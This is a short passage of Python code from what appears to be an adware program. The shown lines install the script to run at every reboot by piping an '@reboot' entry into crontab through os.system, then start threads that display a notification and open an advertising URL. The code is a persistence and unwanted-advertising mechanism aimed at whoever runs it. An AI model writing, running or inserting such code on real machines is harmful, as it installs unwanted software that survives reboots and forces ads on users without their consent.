        else:
            service_name = "adware"
            service_command = f'echo "@reboot {os.path.abspath(__file__)}" | crontab -'
        
        os.system(service_command)

    threading.Thread(target=show_notification).start()
    threading.Thread(target=open_url, args=(ad_url,)).start()
